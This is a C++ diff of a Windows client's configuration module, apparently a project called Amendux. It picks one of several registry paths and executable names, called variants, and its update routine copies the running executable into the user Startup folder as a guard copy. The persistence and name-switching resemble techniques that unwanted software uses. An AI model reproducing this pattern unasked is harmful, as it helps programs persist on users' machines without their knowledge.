@@ -112,18 +112,38 @@ void Config::SetupDataDir()
 }
 
 
+unsigned int FindActiveVariant()
+{
+	for (int i = 0; i < variantCount(); ++i) {
+		HKEY hCurKey = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(i));
+
+		/* Variant mode */
+		DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hCurKey, REG_DWORD, L"ExecMode", sizeof(DWORD));
+		if (dRsexecMode) {
+			RegDB::closeKey(hCurKey);
+			return *dRsexecMode;
+		}
+
+		RegDB::closeKey(hCurKey);
+	}
+		
+	return VARIANT_INVALID;
+}
+
+
 void Config::SetupPersistentConfig()
 {
-	/*HKEY hRoot_0 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(0));
-	HKEY hRoot_1 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(1));
-	HKEY hRoot_2 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(2));
-	HKEY hRoot_3 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(3));
-	HKEY hRoot_4 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(4));
-	HKEY hRoot_5 = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(5));*/
+	HKEY hRoot = nullptr;
 
+	variant = FindActiveVariant();
+	if (variant == VARIANT_INVALID) {
+		variant = Variant::pickVariant();
+	}
 
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux"); //TODO
-	
+	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));
+	DWORD execMode = variant;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
+
 	/* Intance GUID */
 	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
 	if (!dRsTempPath) {
@@ -140,6 +160,11 @@ void Config::SetupPersistentConfig()
 	DWORD procInit = 1;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));
 
+	/* Always write build number */
+	DWORD build = clientVersion;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
+
+#if DEBUG
 	/* Startup couter */
 	DWORD *dRsRunCount = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"RunCount", sizeof(DWORD));
 	if (!dRsRunCount) {
@@ -150,38 +175,38 @@ void Config::SetupPersistentConfig()
 		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"RunCount", &RunCount, sizeof(DWORD));
 	}
 
-	/* Variant mode */
-	DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"ExecMode", sizeof(DWORD));
-	if (!dRsexecMode) {
-		DWORD execMode = Variant::pickVariant();
-		RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
-		variant = execMode;
-	} else {
-		variant = *dRsexecMode;
-	}
-
-	/* Always write build number */
-	DWORD build = clientVersion;
-	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
-
-#if DEBUG
+	/* Debug info */
 	DWORD debugMode = 1;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Debug", &debugMode, sizeof(DWORD));
 	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"DisplayName", DisplayName().c_str(), (DWORD)DisplayName().size() * sizeof(wchar_t));
+	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"ExeName", ExeName().c_str(), (DWORD)ExeName().size() * sizeof(wchar_t));
 	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Path", DataDirectory().c_str(), (DWORD)(DataDirectory().size() * sizeof(wchar_t)));
-#endif
 
 	/* Operation flags */
 	BYTE flags = 0xfe;
 	RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"Flags", &flags, sizeof(BYTE));
+#endif
+
+	RegDB::closeKey(hRoot);
 }
 
 
 void Config::CheckObsoleteConfig()
 {
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux"); //TODO
+	HKEY hRoot = nullptr;
+
+	variant = FindActiveVariant();
+	if (variant == VARIANT_INVALID) {
+		bSuccess = false;
+		return;
+	}
+
+	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));
+
 	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
 	if (!dRsTempPath) {
+		RegDB::closeKey(hRoot);
+
 		bSuccess = false;
 		return;
 	}
@@ -190,19 +215,25 @@ void Config::CheckObsoleteConfig()
 
 	DWORD *procInit = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
 	if (!*procInit || *procInit != 1) {
+		RegDB::closeKey(hRoot);
+
 		bSuccess = false;
 		return;
 	}
 
 	DWORD *build = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"Build", sizeof(DWORD));
 	if (!*build || *build >= clientVersion) {
+		RegDB::closeKey(hRoot);
+
 		bSuccess = false;
 		return;
 	}
+
+	RegDB::closeKey(hRoot);
 }
 
 
-void Config::ApplyUpdate()
+void Config::ApplyUpdate() // TOTEST
 {
 	if (!bSuccess) {
 		return;
@@ -210,7 +241,8 @@ void Config::ApplyUpdate()
 	
 	Log::Info(L"Config", L"Applying update");
 
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux"); //TODO
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));
+
 	std::wstring startupDir = Util::getDirectory(Util::Directory::USER_STARTUP);
 	std::wstring curExec = Util::currentModule();
 	std::wstring appDir = Config::Current()->DataDirectory();
@@ -220,48 +252,59 @@ void Config::ApplyUpdate()
 		return;
 	}
 
-	appDir += L"\\Amendux.exe"; //TODO
-	startupDir += L"\\AmenduxGuard.exe"; //TODO
+	appDir += L"\\" + Config::Current()->ExeName();
 
 	Util::deleteFile(appDir.c_str());
 	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)appDir.c_str());
 
+#if SECURE_DOUBLE_BOOT
+	//TODO
+	startupDir += L"\\AmenduxGuard.exe";
+
 	Util::deleteFile(startupDir.c_str());
 	Util::CopyFile((wchar_t *)curExec.c_str(), (wchar_t *)startupDir.c_str());
+#endif
 
 	DWORD build = clientVersion;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
 
 	PostQuitMessage(0);
+
+	RegDB::closeKey(hRoot);
 }
 
 
 void Config::BasicConfig()
 {
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux"); //TODO
+	HKEY hRoot = nullptr;
+
+	variant = FindActiveVariant();
+	if (variant == VARIANT_INVALID) {
+		bSuccess = false;
+		return;
+	}
+
+	hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegister(variant));
 
 	/* Intance GUID */
 	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
 	if (!dRsTempPath) {
+		RegDB::closeKey(hRoot);
+
 		bSuccess = false;
 		return;
 	}
 
 	instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
 
-	/* Variant mode */
-	DWORD *dRsexecMode = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"ExecMode", sizeof(DWORD));
-	if (!dRsexecMode) {
-		bSuccess = false;
-		return;
-	}
-	
-	variant = *dRsexecMode;
-
 	/* Running procedure, must be 1 */
 	DWORD *procInit = (DWORD *)RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
-	if (!*procInit || *procInit != 1) {
+	if (!procInit || *procInit != 1) {
+		RegDB::closeKey(hRoot);
+
 		bSuccess = false;
 		return;
 	}
+
+	RegDB::closeKey(hRoot);
 }
